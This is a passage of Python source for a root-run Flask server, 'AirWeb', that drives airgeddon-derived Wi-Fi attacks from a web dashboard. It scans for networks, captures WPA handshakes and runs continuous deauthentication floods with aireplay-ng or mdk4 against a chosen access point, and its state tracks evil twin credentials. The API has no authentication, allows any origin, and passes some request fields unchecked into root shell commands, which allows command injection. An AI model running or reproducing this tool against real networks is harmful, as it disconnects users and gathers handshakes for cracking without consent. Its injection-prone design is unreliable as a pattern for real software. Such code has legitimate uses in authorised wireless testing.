#!/usr/bin/env python3
"""
AirWeb - WiFi Security Backend Server
Based on airgeddon v11.61 by v1s1t0r
Web backend by AirWeb

Run as root: sudo python3 server.py
"""

import os, subprocess, threading, time, json, re, shutil
from flask import Flask, request, jsonify
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Allow dashboard.html to call from any origin

# ─── GLOBAL STATE ──────────────────────────────────────────────────────────────
state = {
    "interface": None,
    "monitor_interface": None,
    "mode": "managed",
    "scan_results": [],
    "scanning": False,
    "capture_process": None,
    "clients": [],
    "eviltwin_process": None,
    "eviltwin_clients": 0,
    "eviltwin_credentials": [],
    "active_processes": {},
}

TMPDIR = "/tmp/airweb/"
os.makedirs(TMPDIR, exist_ok=True)

# ─── HANDSHAKE VERIFICATION HELPERS (airgeddon-faithful) ────────────────────
# Source: airgeddon check_bssid_in_captured_file(), is_wpa2_handshake()

def _strip_ansi(text):
    """
    Strip ANSI escape sequences and carriage returns from aircrack-ng output.
    aircrack-ng emits \r\n line endings and various escape codes:
      \x1b[NNm  — colour codes
      \x1b[K    — erase to end of line
      \x1b[NN;NNH — cursor positioning
      \r        — carriage return (makes lines overlap when split on \n only)
    """
    text = re.sub(r"\x1b(?:[@-Z\\-_]|\[[0-9;?]*[ -/]*[@-~])", "", text)
    text = text.replace("\r", "")
    return text

def _ac_verify(capfile, bssid="", timeout_sec=20):
    """
    Core verification using airgeddon's exact method:
      echo "1" | timeout -s SIGTERM <N> aircrack-ng '<file>'
    Captures BOTH stdout and stderr (aircrack-ng may write to either).
    Strips ANSI codes before regex matching.
    Checks for 'WPA (N handshake)' pattern.
    If bssid given, confirms that BSSID appears in a matching line.

    timeout_sec raised to 20 (vs airgeddon's 3) because in a Python subprocess
    pipe there is extra overhead; 3s kills aircrack-ng before it reads large files.
    """
    if not capfile or not os.path.exists(capfile):
        return False, "(file not found)", ""
    sz = os.path.getsize(capfile)
    if sz < 1024:                       # airgeddon minimum guard
        return False, f"(file too small: {sz} bytes)", ""

    try:
        proc = subprocess.Popen(
            f"echo '1' | timeout -s SIGTERM {timeout_sec} aircrack-ng \"{capfile}\" 2>&1",
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,   # merge stderr into stdout — capture everything
            text=True,
            preexec_fn=os.setsid,
        )
        raw, _ = proc.communicate(timeout=timeout_sec + 5)
    except subprocess.TimeoutExpired:
        try: os.killpg(os.getpgid(proc.pid), 9)
        except: pass
        return False, "(aircrack-ng timed out)", ""
    except Exception as e:
        return False, f"(error: {e})", ""

    # Strip ANSI codes that aircrack-ng emits in some builds
    out = _strip_ansi(raw)

    # airgeddon exact regex: WPA \([1-9][0-9]? handshake
    if not re.search(r"WPA \([1-9][0-9]? handshake", out):
        return False, out, out

    # If BSSID supplied, confirm it appears in the matching line
    if bssid:
        bssid_up = bssid.upper()
        for line in out.splitlines():
            line_clean = _strip_ansi(line)
            if re.search(r"WPA \([1-9][0-9]? handshake", line_clean):
                # aircrack output format: "  1  AA:BB:CC:DD:EE:FF  ESSID  WPA (1 handshake)"
                # Also check the whole line for our BSSID (handles varied spacing)
                if bssid_up in line_clean.upper():
                    return True, out, out
        # Handshake found but not for our target BSSID
        return False, out, f"(handshake present but BSSID {bssid} not matched — may be another AP)"

    return True, out, out

def _ac_wpa2_check(capfile, bssid=""):
    """
    Replicates airgeddon is_wpa2_handshake():
      aircrack-ng -a 2 -b <bssid> -w <capfile> <capfile>
    Passes the cap as wordlist — aircrack-ng returns exit 0 when it successfully
    loads a WPA2 handshake and begins cracking (even if key not found in file).
    Returns True only when exit code is 0.
    """
    if not capfile or not os.path.exists(capfile):
        return False
    b_flag = f"-b {bssid}" if bssid else ""
    _, _, rc = run_cmd(
        f"aircrack-ng -a 2 {b_flag} -w \"{capfile}\" \"{capfile}\" > /dev/null 2>&1",
        timeout=20
    )
    return rc == 0


# ─── UTILITIES ────────────────────────────────────────────────────────────────

def run_cmd(cmd, timeout=30):
    """Run a shell command and return stdout, stderr, returncode."""
    try:
        proc = subprocess.run(
            cmd, shell=True, capture_output=True, text=True, timeout=timeout
        )
        return proc.stdout, proc.stderr, proc.returncode
    except subprocess.TimeoutExpired:
        return "", "Command timed out", 1
    except Exception as e:
        return "", str(e), 1

def run_bg(name, cmd):
    """Start a background process, track it."""
    kill_bg(name)
    proc = subprocess.Popen(
        cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, preexec_fn=os.setsid
    )
    state["active_processes"][name] = proc
    return proc

def kill_bg(name):
    """Kill a tracked background process."""
    proc = state["active_processes"].get(name)
    if proc:
        try:
            os.killpg(os.getpgid(proc.pid), 9)
        except:
            pass
        state["active_processes"].pop(name, None)

def read_output(proc, timeout=30):
    """Read output from a process with a timeout."""
    lines = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        line = proc.stdout.readline()
        if not line:
            if proc.poll() is not None:
                break
            time.sleep(0.1)
            continue
        lines.append(line.rstrip())
        if len(lines) > 500:
            break
    return "\n".join(lines)

def tool_exists(tool):
    """Check if a tool exists — searches PATH plus common sbin/aircrack locations."""
    if shutil.which(tool):
        return True
    extra_paths = [
        "/usr/sbin", "/sbin", "/usr/local/sbin",
        "/usr/bin", "/usr/local/bin",
        "/usr/lib/aircrack-ng",
    ]
    for p in extra_paths:
        if os.path.isfile(os.path.join(p, tool)):
            return True
    # Some tools live under a different binary name
    aliases = {
        "airmon-ng":     ["airmon-ng"],
        "airodump-ng":   ["airodump-ng"],
        "aireplay-ng":   ["aireplay-ng"],
        "aircrack-ng":   ["aircrack-ng"],
        "packetforge-ng":["packetforge-ng"],
        "besside-ng":    ["besside-ng"],
        "beef":          ["beef-xss", "beef"],
        "dhcpd":         ["dhcpd", "isc-dhcp-server"],
    }
    for alt in aliases.get(tool, []):
        if shutil.which(alt):
            return True
        for p in extra_paths:
            if os.path.isfile(os.path.join(p, alt)):
                return True
    # Last resort: `which` via shell (picks up shell aliases / non-standard PATH)
    out, _, rc = run_cmd(f"which {tool} 2>/dev/null || command -v {tool} 2>/dev/null")
    return rc == 0 and bool(out.strip())

def get_active_iface():
    return state["monitor_interface"] or state["interface"]

# ─── ROUTES ───────────────────────────────────────────────────────────────────

@app.route("/api/status")
def status():
    return jsonify({
        "online": True,
        "interface": get_active_iface(),
        "mode": state["mode"],
        "monitor_interface": state["monitor_interface"],
    })


@app.route("/api/interfaces")
def interfaces():
    stdout, _, _ = run_cmd("iw dev")
    ifaces = []
    current = {}
    for line in stdout.splitlines():
        line = line.strip()
        if line.startswith("Interface"):
            if current:
                ifaces.append(current)
            name = line.split()[-1]
            current = {"name": name, "mode": "managed", "driver": "", "chipset": ""}
        elif "type" in line and current:
            current["mode"] = line.split()[-1]
    if current:
        ifaces.append(current)

    # Get driver info via ethtool / lspci
    for i in ifaces:
        out, _, _ = run_cmd(f"cat /sys/class/net/{i['name']}/device/uevent 2>/dev/null | grep DRIVER")
        for line in out.splitlines():
            if "DRIVER=" in line:
                i["driver"] = line.split("=")[-1]

    if not ifaces:
        stdout2, _, _ = run_cmd("ip link show")
        for line in stdout2.splitlines():
            m = re.match(r"\d+: (\w+):", line)
            if m and m.group(1) not in ("lo", "eth0", "ens", "enp"):
                ifaces.append({"name": m.group(1), "mode": "?", "driver": "", "chipset": ""})

    return jsonify({"interfaces": ifaces})


@app.route("/api/monitor/enable", methods=["POST"])
def monitor_enable():
    data    = request.json or {}
    iface   = (data.get("interface") or "").strip() or state.get("interface") or ""
    channel = (data.get("channel") or "").strip()
    if not iface:
        return jsonify({"error": "No interface specified — enter the interface name first"})

    log = []

    # Step 1: kill processes that hold the interface
    log.append(f"[*] Running: airmon-ng check kill")
    kill_out, _, _ = run_cmd("airmon-ng check kill", timeout=15)
    if kill_out.strip():
        log.append(kill_out.strip())
    time.sleep(1)

    # Step 2: run airmon-ng start with a generous timeout
    ch_arg = channel if channel else ""
    cmd = f"airmon-ng start {iface} {ch_arg}".strip()
    log.append(f"[*] Running: {cmd}")
    stdout, stderr, rc = run_cmd(cmd, timeout=60)
    combined = stdout + stderr
    log.append(combined.strip() if combined.strip() else "(no output)")

    # Step 3: detect the new monitor interface name from multiple sources
    mon_iface = None

    def _clean_iface_name(raw):
        """Strip [phyN] prefix (e.g. '[phy0]wlp0s20f3mon' -> 'wlp0s20f3mon').
        airmon-ng emits this on Intel/predictable-name cards; brackets break tools."""
        if not raw: return raw
        import re as _re
        return _re.sub(r"^\[phy\d+\]", "", raw.strip().rstrip(")")).strip()

    patterns = [
        r"monitor mode (?:vif )?enabled (?:for .+ )?on (.+?)[\)\s]",
        r"monitor mode (?:already )?enabled on (\S+)",
        r"\(mac80211 monitor mode vif enabled for .+? on (\S+)\)",
        r"^\s*(\S+)\s+\(mac80211 monitor",
        r"Interface\s+(\S+mon\S*)",
    ]
    for line in combined.splitlines():
        for pat in patterns:
            m = re.search(pat, line, re.IGNORECASE)
            if m:
                candidate = _clean_iface_name(m.group(1))
                if candidate and len(candidate) > 1:
                    mon_iface = candidate
                    log.append(f"[*] Detected from airmon output: {mon_iface}")
                    break
        if mon_iface:
            break

    # Source B: iw dev — authoritative kernel name, run unconditionally to correct Source A
    iw_out, _, _ = run_cmd("iw dev", timeout=10)
    cur_b = None
    for line in iw_out.splitlines():
        line = line.strip()
        m = re.match(r"Interface\s+(\S+)", line)
        if m: cur_b = _clean_iface_name(m.group(1))
        if "type monitor" in line.lower() and cur_b:
            if not mon_iface or mon_iface != cur_b:
                log.append(f"[*] iw dev {'detects' if not mon_iface else 'overrides to'}: {cur_b}")
                mon_iface = cur_b
            break

    if not mon_iface:
        for c in [iface+"mon", iface+"mon0", "mon0", "wlan0mon", "wlan1mon"]:
            chk, _, _ = run_cmd(f"iw dev {c} info 2>/dev/null", timeout=5)
            if "type monitor" in chk.lower() or "wiphy" in chk.lower():
                mon_iface = c; log.append(f"[*] Found by probe: {mon_iface}"); break

    if not mon_iface:
        mon_iface = iface + "mon"
        log.append(f"[!] Could not auto-detect — assuming: {mon_iface} (verify with: iw dev)")

    mon_iface = _clean_iface_name(mon_iface)
    log.append(f"[*] Final monitor interface: {mon_iface}")
    state["monitor_interface"] = mon_iface
    state["mode"] = "monitor"
    state["interface"] = iface

    return jsonify({
        "success": f"Monitor mode enabled on {mon_iface}",
        "new_interface": mon_iface,
        "output": "\n".join(log),
        "log": log,
    })


@app.route("/api/monitor/disable", methods=["POST"])
def monitor_disable():
    data = request.json or {}
    iface = data.get("interface") or state["monitor_interface"] or state["interface"]
    if not iface:
        return jsonify({"error": "No interface specified"})

    stdout, stderr, rc = run_cmd(f"airmon-ng stop {iface}")
    run_cmd("service NetworkManager restart 2>/dev/null || nmcli networking on 2>/dev/null || true")

    state["monitor_interface"] = None
    state["mode"] = "managed"

    return jsonify({"success": f"Monitor mode disabled on {iface}", "output": stdout + stderr})


# ── SCAN ──────────────────────────────────────────────────────────────────────

def parse_airodump(csv_file):
    """Parse airodump-ng CSV output into a list of network dicts.

    CSV column layout (0-indexed):
      0  BSSID
      1  First time seen
      2  Last time seen
      3  channel
      4  Speed
      5  Privacy  (WPA2, WEP, OPN …)
      6  Cipher
      7  Authentication
      8  Power
      9  # beacons
      10 # IV
      11 LAN IP
      12 ID-length
      13 ESSID          ← may contain commas; join parts[13:] to reconstruct
      14 Key (optional)

    Robustness notes:
    - airodump-ng writes a blank line between the AP section and the Station section.
    - SSIDs that contain commas will split into extra columns — we join everything
      from parts[13] onward (trimming the trailing empty "Key" field).
    - The file may be partially written mid-rotation; we silently skip malformed rows.
    """
    networks = []
    if not os.path.exists(csv_file):
        return networks
    try:
        with open(csv_file, encoding="latin-1") as f:
            lines = f.readlines()
        in_ap = True
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if line.startswith("Station MAC"):
                in_ap = False
                continue
            if not in_ap:
                continue
            # Skip header rows
            if line.startswith("BSSID") or line.startswith("Station"):
                continue
            parts = [p.strip() for p in line.split(",")]
            if len(parts) < 14:
                continue
            bssid = parts[0]
            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
                continue
            try:
                pwr = int(parts[8])
            except (ValueError, IndexError):
                pwr = -99
            try:
                channel = int(parts[3])
            except (ValueError, IndexError):
                channel = 0
            enc = parts[5] if len(parts) > 5 else ""
            # Reconstruct SSID — join all columns from 13 onward, drop trailing empty "Key" field
            ssid_parts = parts[13:]
            # Drop a trailing empty string (the "Key" column)
            while ssid_parts and ssid_parts[-1] == "":
                ssid_parts.pop()
            ssid = ",".join(ssid_parts).strip()
            networks.append({
                "bssid": bssid,
                "ssid": ssid,
                "channel": channel,
                "power": pwr,
                "enc": enc,
                "wps": False,
                "clients": 0,
            })
    except Exception:
        pass
    return networks


@app.route("/api/scan/start", methods=["POST"])
def scan_start():
    data = request.json or {}
    band       = data.get("band", "bg")
    scan_time  = int(data.get("time", 15))
    clear_old  = data.get("clear", False)
    iface = get_active_iface()
    if not iface:
        return jsonify({"error": "No interface in monitor mode. Enable monitor mode first."})

    out_prefix = TMPDIR + "scan"
    kill_bg("scan")

    # Always clear old CSV/cap so stale results never leak into the new scan
    for f in ["scan-01.csv", "scan-01.cap", "scan-01.kismet.csv", "scan-01.log.csv"]:
        try: os.remove(TMPDIR + f)
        except: pass

    # Clear in-memory results so /api/scan/results never returns stale data
    state["scan_results"] = []

    band_flag = f"--band {band}" if band != "bg" else ""
    cmd = f"airodump-ng {band_flag} -w {out_prefix} --output-format csv {iface}"
    proc = run_bg("scan", cmd)
    state["scanning"] = True

    def auto_stop():
        time.sleep(scan_time)
        kill_bg("scan")
        time.sleep(0.8)  # let OS flush CSV write buffer
        nets = parse_airodump(out_prefix + "-01.csv")
        state["scan_results"] = nets  # results BEFORE flag
        state["scanning"] = False

    threading.Thread(target=auto_stop, daemon=True).start()

    return jsonify({"success": "Scan started", "pid": proc.pid, "interface": iface})


@app.route("/api/scan/results")
def scan_results():
    # Live parse if still scanning
    csv_file = TMPDIR + "scan-01.csv"
    nets = parse_airodump(csv_file)
    if nets:
        state["scan_results"] = nets
    return jsonify({
        "networks": state["scan_results"],
        "scanning": state["scanning"]
    })


@app.route("/api/scan/stop", methods=["POST"])
def scan_stop():
    kill_bg("scan")
    state["scanning"] = False
    return jsonify({"success": "Scan stopped"})


# ── CAPTURE / MONITOR ─────────────────────────────────────────────────────────

@app.route("/api/capture/start", methods=["POST"])
def capture_start():
    data = request.json or {}
    bssid = data.get("bssid")
    channel = data.get("channel")
    output = data.get("output", TMPDIR + "capture")
    iface = get_active_iface()
    if not iface:
        return jsonify({"error": "No monitor interface available"})

    bssid_flag = f"--bssid {bssid}" if bssid else ""
    ch_flag = f"--channel {channel}" if channel else ""
    cmd = f"airodump-ng {bssid_flag} {ch_flag} -w {output} --output-format pcap {iface}"
    proc = run_bg("capture", cmd)

    return jsonify({"success": f"Capture started on {iface}", "pid": proc.pid})


@app.route("/api/capture/clients")
def capture_clients():
    # Dynamically find all CSV files in TMPDIR
    csv_candidates = sorted([
        os.path.join(TMPDIR, f)
        for f in os.listdir(TMPDIR)
        if f.endswith(".csv") and not f.endswith(".kismet.csv") and not f.endswith(".log.csv")
    ])
    clients = []
    for csv in csv_candidates:
        try:
            with open(csv, encoding="latin-1") as f:
                in_station = False
                for line in f:
                    line = line.strip()
                    if line.startswith("Station MAC"):
                        in_station = True
                        continue
                    if not in_station:
                        continue
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) > 5 and re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", parts[0]):
                        mac = parts[0]
                        # bssid of associated AP is parts[5]
                        entry = mac
                        if len(parts) > 5 and parts[5]:
                            entry = f"{mac} → {parts[5].strip()}"
                        if mac not in [c.split(" →")[0] for c in clients]:
                            clients.append(entry)
        except:
            pass
    state["clients"] = clients
    return jsonify({"clients": clients})


@app.route("/api/capture/capstatus")
def capture_capstatus():
    """Live status of the running handshake capture."""
    cap_file = state.get("last_cap_file", "")
    csv_file = state.get("last_csv_file", "")

    # Fallback: find newest cap in TMPDIR
    if not cap_file or not os.path.exists(cap_file):
        caps = sorted([os.path.join(TMPDIR, f) for f in os.listdir(TMPDIR) if f.endswith(".cap")])
        cap_file = caps[-1] if caps else ""
    if not csv_file or not os.path.exists(csv_file):
        csvs = sorted([os.path.join(TMPDIR, f) for f in os.listdir(TMPDIR)
                       if f.endswith(".csv") and "kismet" not in f and "log" not in f])
        csv_file = csvs[-1] if csvs else ""
    cap_size  = os.path.getsize(cap_file) if os.path.exists(cap_file) else 0
    # Count packets via tshark if available, else use file size heuristic
    packets = 0
    if cap_size > 0 and tool_exists("tshark"):
        out, _, _ = run_cmd(f"tshark -r '{cap_file}' -T fields -e frame.number 2>/dev/null | tail -1")
        try: packets = int(out.strip())
        except: packets = cap_size // 100
    elif cap_size > 0:
        packets = cap_size // 100

    # Trust ONLY the authoritative state set by hs_worker after closed-file verification.
    # Do NOT run aircrack-ng here on the live file — that causes false positives because
    # aircrack-ng can report "1 handshake" on an incomplete 4-way exchange while airodump
    # is still writing. The hs_worker handles the double-verify pattern correctly.
    has_hs = state.get("handshake_found", False)

    # Read clients from ALL csvs in TMPDIR (capture + handshake)
    clients = []
    all_csvs = sorted([
        os.path.join(TMPDIR, f) for f in os.listdir(TMPDIR)
        if f.endswith(".csv") and "kismet" not in f and "log" not in f
    ])
    seen_macs = set()
    for csv_path in all_csvs:
        try:
            with open(csv_path, encoding="latin-1") as fh:
                in_station = False
                for line in fh:
                    line = line.strip()
                    if line.startswith("Station MAC"):
                        in_station = True; continue
                    if not in_station: continue
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) > 5:
                        mac = parts[0]
                        if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) and mac not in seen_macs:
                            seen_macs.add(mac)
                            assoc = parts[5].strip() if len(parts) > 5 else ""
                            clients.append(f"{mac}" + (f" → {assoc}" if assoc else ""))
        except:
            pass

    # NOTE: clients and handshake are independent; a handshake can be found
    # even if CSV shows 0 clients (timing/rotation issue) — report both truthfully
    hs_msg = "FOUND ✓" if has_hs else ("Capturing..." if state.get("handshake_running") else "Idle")
    return jsonify({
        "running":      state.get("handshake_running", False),
        "found":        has_hs,
        "cap_file":     cap_file,
        "cap_size":     cap_size,
        "packets":      packets,
        "clients":      clients,
        "client_count": len(clients),
        "status":       hs_msg,
        "error":        None,
    })


@app.route("/api/capture/stop", methods=["POST"])
def capture_stop():
    kill_bg("capture")
    kill_bg("handshake_cap")  # also stop handshake captures
    return jsonify({"success": "Capture stopped"})


# ── HANDSHAKE ────────────────────────────────────────────────────────────────

@app.route("/api/handshake/capture", methods=["POST"])
def handshake_capture():
    """
    WPA handshake capture — faithfully ported from airgeddon v11.61.

    airgeddon key patterns used here:
      airodump-ng  : -c <channel> -d <bssid> -w <prefix>   (NOT --channel/--bssid)
      aireplay-ng  : --deauth 0 -a <bssid> --ignore-negative-one <iface>  (continuous, 0=infinite)
      mdk4 fallback: mdk4 <iface> d -b <bssid_file> -c <channel>          (amok mode)
      verification : echo "1" | timeout -s SIGTERM 3 aircrack-ng <file>
                     grep -E "WPA ([1-9][0-9]? handshake"  (exact airgeddon regex)
      wpa2 check   : aircrack-ng -a 2 -b <bssid> -w <file> <file>         (secondary validation)

    Execution model (mirrors airgeddon):
      - airodump-ng starts first, capturing on the locked channel
      - deauth fires in a SEPARATE daemon thread (never blocks the check loop)
      - check loop polls every 5 s using the exact airgeddon verification method
      - on candidate: kill airodump, flush 2 s, re-verify on CLOSED file
      - false positive: restart on new prefix, keep going
      - timeout: final closed-file check then FAILED_NO_HANDSHAKE
    """
    data    = request.json or {}
    bssid   = (data.get("bssid") or "").strip().upper()
    channel = str((data.get("channel") or "")).strip()
    client  = (data.get("client") or "").strip().upper()
    timeout = int(data.get("timeout", 30))
    iface   = get_active_iface()

    if not bssid or not channel:
        return jsonify({"error": "BSSID and channel required"})
    if not iface:
        return jsonify({"error": "No monitor interface. Enable monitor mode first."})
    if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid):
        return jsonify({"error": f"Invalid BSSID: {bssid}"})

    # Normalise client MAC — treat broadcast as empty (airgeddon omits -c for broadcast)
    # Also explicitly reject FF:FF:FF:FF:FF:FF so it's never passed as -c
    _BROADCAST_MAC = "FF:FF:FF:FF:FF:FF"
    if (not client
            or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", client)
            or client.upper() == _BROADCAST_MAC):
        client = ""  # empty = broadcast deauth with no -c flag

    # ── Choose a fresh file prefix ────────────────────────────────────────────
    def _next_prefix():
        for i in range(1, 500):
            if not os.path.exists(TMPDIR + f"hs{i}-01.cap"):
                return TMPDIR + f"hs{i}", TMPDIR + f"hs{i}-01.cap", TMPDIR + f"hs{i}-01.csv"
        return TMPDIR + "hs99", TMPDIR + "hs99-01.cap", TMPDIR + "hs99-01.csv"

    cap_prefix, cap_file, csv_file = _next_prefix()
    cap_num      = cap_prefix.split("hs")[-1]
    display_name = f"handshake-{int(cap_num):02d}.cap"

    # ── Force interface onto the correct channel (mirrors airgeddon iw dev set channel) ──
    run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
            f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)

    # ── Build airodump-ng command (airgeddon uses -c and -d, NOT --channel/--bssid) ──
    # airgeddon: airodump-ng -c ${channel} -d ${bssid} -w ${tmpdir}handshake ${interface}
    dump_cmd = f"airodump-ng -c {channel} -d {bssid} -w {cap_prefix} {iface}"
    dump_proc = run_bg("handshake_cap", dump_cmd)

    # Give airodump 1.5 s to open the output file before we start checking
    time.sleep(1.5)
    if dump_proc.poll() is not None:
        return jsonify({
            "error": (f"airodump-ng exited immediately on interface '{iface}'. "
                      "Verify monitor mode is active: iw dev")
        })

    # ── Persist state ─────────────────────────────────────────────────────────
    state["last_cap_file"]     = cap_file
    state["last_cap_prefix"]   = cap_prefix
    state["last_csv_file"]     = csv_file
    state["last_bssid"]        = bssid
    state["handshake_running"] = True
    state["handshake_found"]   = False
    state["handshake_result"]  = "running"
    state["hs_log"]            = []

    def _log(msg):
        state["hs_log"].append(msg)

    log_lines = [
        f"[*] Interface  : {iface}",
        f"[*] Target     : {bssid}  CH{channel}",
        f"[*] Client     : {client or 'broadcast (FF:FF:FF:FF:FF:FF)'}",
        f"[*] Output file: {cap_file}  (shown as {display_name})",
        f"[*] airodump   : airodump-ng -c {channel} -d {bssid} -w {cap_prefix} {iface}",
        f"[*] airodump-ng started (PID {dump_proc.pid})",
        f"[*] Timeout    : {timeout}s  |  Deauth starts in 2s...",
    ]
    # NOTE: log_lines are returned in the API response (r.output) and printed
    # by the JS api() helper directly. Do NOT also add them to hs_log or the
    # poller will stream them a second time causing the duplicate-print bug.
    # hs_log starts empty — only worker progress appended from here on.

    # ── Verification helpers (exact airgeddon method) ─────────────────────────

    def _full_verify(filepath):
        """
        Full verification using module-level _ac_verify() + _ac_wpa2_check().
        These use the fixed timeout (20 s), capture both stdout+stderr,
        strip ANSI codes, and match the exact airgeddon WPA regex.
        """
        ok, raw, _ = _ac_verify(filepath, bssid)
        if not ok:
            _log(f"[-] Verify failed: {raw[:120] if raw else 'no output'}")
            return False
        # WPA2 secondary check (airgeddon is_wpa2_handshake) — warn but don't block
        if not _ac_wpa2_check(filepath, bssid):
            _log("[!] WPA2 secondary check failed — handshake may be WPA1/TKIP (still crackable)")
        return True

    # ── Worker ────────────────────────────────────────────────────────────────
    def hs_worker():
        current_cap    = cap_file
        current_prefix = cap_prefix

        # ── Deauth thread (mirrors airgeddon: continuous, separate process) ───
        deauth_stop = threading.Event()

        def _deauth_loop():
            """
            airgeddon: aireplay-ng --deauth 0 -a <bssid> --ignore-negative-one <iface>
            Robustness additions:
            1. Hard channel lock before launching — prevents "fixed channel" errors
            2. Three-tier aireplay-ng fallback on immediate exit:
               a) --deauth 0 --ignore-negative-one  (airgeddon exact)
               b) --deauth 0  (without --ignore-negative-one)
               c) -0 0  (short flag, older builds)
            3. Captures stderr for diagnostics on exit
            4. Re-locks channel every 3 bursts to prevent drift
            5. mdk4 fallback when all aireplay-ng variants fail
            """
            time.sleep(2)

            # Write BSSID file for mdk4 (mirrors airgeddon ${tmpdir}bl.txt)
            bl_file = TMPDIR + "bl.txt"
            try:
                with open(bl_file, "w") as _f:
                    _f.write(bssid + "\n")
            except Exception:
                pass

            # Hard channel lock before deauth — critical on Intel/Realtek drivers
            run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                    f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)

            burst       = 0
            working_cmd = None  # cache the variant that works

            def _try_aireplay(cmd, label):
                """Launch aireplay-ng, wait 2 s, return proc if alive else None."""
                try:
                    p = subprocess.Popen(
                        cmd, shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, preexec_fn=os.setsid
                    )
                    deauth_stop.wait(2)
                    if p.poll() is None:
                        return p
                    try:
                        err = p.stdout.read(300).strip()
                    except Exception:
                        err = ""
                    _log(f"[!] aireplay-ng ({label}) exited: {err[:120] if err else 'no output'}")
                    return None
                except Exception as e:
                    _log(f"[!] aireplay-ng launch ({label}): {e}")
                    return None

            while not deauth_stop.is_set():
                burst += 1
                # Never pass -c FF:FF:FF:FF:FF:FF — broadcast MAC must have NO -c flag.
                # Sending -c with broadcast MAC causes aireplay-ng to send targeted
                # deauth to FF:FF:FF:FF:FF:FF which APs drop. Omit -c entirely for broadcast.
                _BROADCAST = "FF:FF:FF:FF:FF:FF"
                c_flag = f"-c {client} " if (client and client.upper() != _BROADCAST) else ""

                if tool_exists("aireplay-ng"):
                    proc = None

                    if working_cmd is None:
                        # Tier 1: airgeddon exact
                        cmd1  = f"aireplay-ng --deauth 0 -a {bssid} {c_flag}--ignore-negative-one {iface}"
                        proc  = _try_aireplay(cmd1, "tier1 --deauth 0 --ignore-negative-one")
                        if proc:
                            working_cmd = cmd1
                            _log(f"[*] Deauth running (tier 1): {cmd1}")
                        else:
                            # Tier 2: without --ignore-negative-one
                            cmd2 = f"aireplay-ng --deauth 0 -a {bssid} {c_flag}{iface}"
                            proc = _try_aireplay(cmd2, "tier2 --deauth 0")
                            if proc:
                                working_cmd = cmd2
                                _log(f"[*] Deauth running (tier 2): {cmd2}")
                            else:
                                # Tier 3: short flag
                                cmd3 = f"aireplay-ng -0 0 -a {bssid} {c_flag}{iface}"
                                proc = _try_aireplay(cmd3, "tier3 -0 0")
                                if proc:
                                    working_cmd = cmd3
                                    _log(f"[*] Deauth running (tier 3): {cmd3}")
                                else:
                                    working_cmd = "FAILED"
                                    _log("[!] All aireplay-ng variants exited immediately")
                                    _log(f"    Verify injection: aireplay-ng --test {iface}")
                    else:
                        # Subsequent bursts — reuse known working command
                        if working_cmd != "FAILED":
                            try:
                                proc = subprocess.Popen(
                                    working_cmd, shell=True,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                    preexec_fn=os.setsid
                                )
                                # Re-check it didn't exit immediately on burst >1
                                deauth_stop.wait(1.5)
                                if proc.poll() is not None:
                                    _log(f"[!] Deauth exited on burst {burst} — re-probing")
                                    working_cmd = None  # force re-probe next iteration
                                    proc = None
                            except Exception:
                                proc = None

                    if proc and proc.poll() is None:
                        deauth_stop.wait(12)
                        try:
                            os.killpg(os.getpgid(proc.pid), 9)
                        except Exception:
                            pass
                        # NOTE: do NOT re-lock channel here — airodump-ng holds the channel
                        # lock and calling iw dev set channel while it runs interrupts
                        # airodump's capture, freezing the file size.
                        continue

                    # aireplay-ng failed — try mdk4
                    if tool_exists("mdk4"):
                        da_cmd = f"mdk4 {iface} d -b {bl_file} -c {channel}"
                        try:
                            proc = subprocess.Popen(
                                da_cmd, shell=True,
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                preexec_fn=os.setsid
                            )
                            if burst == 1:
                                _log(f"[*] mdk4 deauth fallback: {da_cmd}")
                        except Exception as e:
                            _log(f"[!] mdk4 also failed: {e}")
                            return
                        deauth_stop.wait(12)
                        try:
                            os.killpg(os.getpgid(proc.pid), 9)
                        except Exception:
                            pass
                    else:
                        if burst == 1:
                            _log("[!] aireplay-ng failed and mdk4 not installed")
                            _log("    Capture continues — handshake may arrive on natural reconnect")
                        deauth_stop.wait(10)

                elif tool_exists("mdk4"):
                    da_cmd = f"mdk4 {iface} d -b {bl_file} -c {channel}"
                    try:
                        proc = subprocess.Popen(
                            da_cmd, shell=True,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                            preexec_fn=os.setsid
                        )
                        if burst == 1:
                            _log(f"[*] aireplay-ng not found — mdk4: {da_cmd}")
                    except Exception as e:
                        _log(f"[!] mdk4 error: {e}")
                        return
                    deauth_stop.wait(12)
                    try:
                        os.killpg(os.getpgid(proc.pid), 9)
                    except Exception:
                        pass
                else:
                    _log("[!] Neither aireplay-ng nor mdk4 found — install aircrack-ng and mdk4")
                    return
        deauth_thread = threading.Thread(target=_deauth_loop, daemon=True)
        deauth_thread.start()

        # ── Allocate new prefix on false-positive restart ─────────────────────
        def _next_prefix_local():
            for i in range(1, 500):
                if not os.path.exists(TMPDIR + f"hs{i}-01.cap"):
                    return TMPDIR + f"hs{i}", TMPDIR + f"hs{i}-01.cap", TMPDIR + f"hs{i}-01.csv"
            return TMPDIR + "hs99", TMPDIR + "hs99-01.cap", TMPDIR + "hs99-01.csv"

        def _restart_airodump(reason):
            nonlocal current_cap, current_prefix
            _log(f"[~] {reason} — restarting airodump on new prefix")
            kill_bg("handshake_cap")
            time.sleep(0.5)
            new_prefix, new_cap, new_csv = _next_prefix_local()
            current_prefix = new_prefix
